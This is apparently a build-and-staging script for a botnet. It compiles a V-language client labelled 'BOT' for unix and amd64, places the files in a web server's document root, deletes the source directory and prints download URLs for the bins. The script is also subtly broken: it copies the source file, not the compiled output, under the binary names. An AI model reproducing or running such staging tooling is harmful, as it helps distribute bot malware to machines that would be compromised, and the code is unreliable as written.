client_file="client.v"
# Compile normal unix BOT => /var/www/html/unix
/bin/v/v $client_file; cp $client_file unix; mv unix /var/www/html/
# Compile amd64 BOT => /var/www/html/amd64
/bin/v/v $client_file; cp $client_file amd64; mv amd64 /var/www/html/

# Delete Client
rm -rf client

system_ip=$(hostname -I)

echo "Bins: "
echo "Unix: http://$system_ip/unix"
echo "amd64 http://$system_ip/amd64"